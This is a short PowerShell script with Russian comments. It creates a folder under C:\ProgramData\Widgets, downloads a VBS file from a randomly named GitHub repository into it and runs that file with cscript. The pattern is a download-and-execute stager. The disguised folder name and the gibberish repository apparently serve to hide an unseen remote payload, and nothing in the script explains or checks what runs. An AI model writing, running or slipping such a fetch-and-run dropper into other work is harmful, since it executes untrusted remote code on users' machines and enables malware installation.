# Задаём URL и путь сохранения
$url = 'https://raw.githubusercontent.com/MGrinxDev/iyuotkjgrcnuiyftvcp-/refs/heads/main/run.vbs'
$file = 'C:\ProgramData\Widgets\run.vbs'

# Создаём папку, если её нет
if (-not (Test-Path 'C:\ProgramData\Widgets')) {
    New-Item 'C:\ProgramData\Widgets' -ItemType Directory | Out-Null
}

# Скачиваем файл
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $file)

# Запускаем VBS
cscript $file
